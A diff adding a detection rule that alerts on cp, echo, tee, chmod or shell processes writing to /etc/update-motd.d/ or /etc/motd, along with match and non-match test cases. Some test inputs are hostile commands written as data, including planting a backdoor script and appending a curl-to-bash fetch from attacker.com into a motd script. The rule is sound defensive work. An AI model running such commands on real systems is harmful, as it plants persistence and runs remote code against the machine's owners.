@@ -1,0 +1,48 @@
+name: elastic_motd_persistence
+mode: alert
+eval: |
+  (
+    (
+      e.process_args.contains("/etc/update-motd.d/") ||
+      e.process_args.contains("/etc/motd") ||
+      e.process_args.contains("update-motd")
+    ) &&
+    (
+      e.process_name == "cp" ||
+      e.process_name == "mv" ||
+      e.process_name == "echo" ||
+      e.process_name == "tee" ||
+      e.process_name == "chmod" ||
+      e.process_name == "bash" ||
+      e.process_name == "sh"
+    )
+  )
+tests:
+  - cleartext: "copy malicious script to motd"
+    process_name: cp
+    process_args: "cp /tmp/backdoor.sh /etc/update-motd.d/99-backdoor"
+    should_match: true
+  - cleartext: "echo backdoor to motd"
+    process_name: echo
+    process_args: "echo 'curl http://attacker.com/shell.sh | bash' >> /etc/update-motd.d/10-help-text"
+    should_match: true
+  - cleartext: "chmod motd script"
+    process_name: chmod
+    process_args: "chmod +x /etc/update-motd.d/99-persistence"
+    should_match: true
+  - cleartext: "modify motd with tee"
+    process_name: tee
+    process_args: "tee -a /etc/update-motd.d/50-motd-news"
+    should_match: true
+  - cleartext: "bash editing motd"
+    process_name: bash
+    process_args: "bash -c echo payload > /etc/motd"
+    should_match: true
+  - cleartext: "normal chmod"
+    process_name: chmod
+    process_args: "chmod 755 /usr/bin/script.sh"
+    should_match: false
+  - cleartext: "regular echo"
+    process_name: echo
+    process_args: "echo hello world"
+    should_match: false
